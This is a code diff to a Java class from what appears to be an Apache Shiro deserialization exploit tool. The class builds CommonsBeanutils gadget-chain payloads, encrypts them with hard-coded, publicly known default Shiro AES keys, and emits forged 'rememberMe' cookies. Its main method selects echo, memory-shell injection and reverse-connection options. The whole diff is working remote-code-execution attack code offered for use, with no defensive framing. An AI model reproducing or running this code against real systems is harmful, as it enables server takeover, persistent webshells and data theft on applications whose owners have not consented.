@@ -10,47 +10,42 @@ import java.util.Arrays;
 import java.util.List;
 import javax.xml.bind.DatatypeConverter;
 import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.crypto.CipherService;
 import org.apache.shiro.util.ByteSource;
 
 
 
 public class Shiro implements FramePayload {
+    public Shiro() {
+    }
+
     @Override
     public String sendpayload(Object ChainObject) throws Exception {
         return null;
     }
 
-
     @Override
-    public String sendpayload(Object chainObject, String key) throws Exception {
+    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
         byte[] serpayload = SerializableUtils.toByteArray(chainObject);
-
         byte[] bkey = DatatypeConverter.parseBase64Binary(key);
-
         byte[] encryptpayload = null;
-
+//        byte[] encryptpayload;
         if (AttackService.aesGcmCipherType == 1) {
-            AesCipherService aesCipherService = new AesCipherService();
-            ByteSource byteSource = aesCipherService.encrypt(serpayload, bkey);
+            CipherService cipherService = new AesCipherService();
+            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
             encryptpayload = byteSource.getBytes();
         } else {
             encryptpayload = AesUtil.encrypt(serpayload, bkey);
         }
 
-        return "rememberMe=" + DatatypeConverter.printBase64Binary(encryptpayload);
+        return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
     }
 
-
-
     public static void main(String[] args) throws Exception {
-        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass("CommonsBeanutilsString");
-        ObjectPayload<?> gadgetpayload = gadgetClazz.newInstance();
-
-
-        List<String> echoList = Arrays.asList(new String[] { "TomcatEcho", "Tomcat1Echo", "InjectMemTool", "SpringEcho", "NoEcho", "JbossEcho", "WeblogicEcho", "TomcatHeaderEcho", "InjectMemTool" });
-
-        String option = "TomcatEcho";
-
+        Class<? extends ObjectPayload> gadgetClazz = (Class<? extends ObjectPayload>) Utils.getPayloadClass("CommonsBeanutilsAttrCompare");
+        ObjectPayload<?> gadgetpayload = (ObjectPayload) gadgetClazz.newInstance();
+        List<String> echoList = Arrays.asList("TomcatEcho", "Tomcat1Echo", "InjectMemTool", "SpringEcho", "NoEcho", "ReverseEcho", "TomcatHeaderEcho", "InjectMemTool");
+        String option = "ReverseEcho";
         Object template = null;
         Object chainObject = null;
         if (echoList.contains(option)) {
@@ -60,11 +55,13 @@ public class Shiro implements FramePayload {
         }
 
         Shiro shiro = new Shiro();
-        if (template != null && !option.equals("Resin4Echo")) {
+        if (template != null) {
             chainObject = gadgetpayload.getObject(template);
-            String sendpayload = shiro.sendpayload(chainObject, "kPH+bIxk5D2deZiIxcaaaA==");
+            AttackService.aesGcmCipherType = 1;
+            String sendpayload = shiro.sendpayload(chainObject, "rememberMe", "4AvVhmFLUs0KTA3Kprsdag==");
             System.out.println(sendpayload);
         }
+
     }
 }
 
